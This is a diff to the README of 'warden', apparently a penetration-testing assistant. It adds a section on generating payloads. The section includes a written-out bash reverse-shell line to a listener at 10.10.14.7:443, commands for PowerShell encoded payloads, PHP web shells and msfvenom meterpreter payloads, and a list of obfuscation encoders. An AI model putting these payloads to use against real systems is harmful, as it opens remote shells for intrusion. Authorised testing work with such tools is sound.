@@ -65,12 +65,44 @@ cargo build --release
 Interactive tools (evil-winrm, ftp, mssqlclient, psexec…) are detected and the exact
 command is printed for you to run in a separate terminal — they need a real TTY.
 
+## Payload generation
+
+Built-in revshells + msfvenom, with an encoding/obfuscation pipeline. Set your
+listener once, then generate in any language:
+
+```
+/set lhost 10.10.14.7
+/set lport 443
+/payload bash-devtcp                     # bash -i >& /dev/tcp/10.10.14.7/443 0>&1
+/payload ps-tcpclient +ps-encodedcommand # UTF-16LE+base64 -> powershell -enc <blob>
+/payload php-webshell                     # ?cmd= web shell
+/msf win-meterpreter-tcp                  # full msfvenom line + multi/handler
+/payloads windows                         # list payloads (filter by os/lang/kind/id)
+```
+
+- **32 payloads** across bash, sh, powershell, cmd, python, php, perl, ruby, node,
+  java/jsp, aspx, war, go, C, C#, lua, awk, socat, nc/ncat, telnet, openssl — reverse
+  shells, bind shells, web shells, stagers, file-transfer one-liners, and the full
+  TTY-upgrade sequence.
+- **11 msfvenom specs** (windows/linux meterpreter + stageless, php/jsp/war/aspx/msi)
+  each with the matching handler or `nc` listener, `-b` badchar and `-e` encoder support.
+- **Encoding/obfuscation transforms** applied with `+<name>`: `base64`,
+  `ps-encodedcommand`, `hex`, `url-encode`, `double-url-encode`, `xor-ps-stub`,
+  `ps-char-array`, `bash-b64-exec`, `py-b64-exec`, `php-b64-eval`. Every generated
+  payload is saved to `loot/` and the matching listener is printed alongside it.
+
+Scope note: these are the standard revshells.com / msfvenom / OSCP-curriculum payloads
+and signature-level encoders. warden does not implement in-memory injection, syscall
+stubs, or EDR-unhooking primitives — it generates and encodes, it does not build
+behavioural-evasion capability.
+
 ## Architecture
 
 ```
 src/
   model/     phases, hosts/services, credentials, engagement state (serde)
   parse/     nmap XML parser + credential/intel harvester
+  payload/   revshell/webshell catalog + encoding transforms + msfvenom builder
   catalog/   declarative tool registry + template renderer + suggestion engine
   engine/    async job runner (streaming, timeouts, cancellation) + workspace persistence
   notes/     markdown report generator
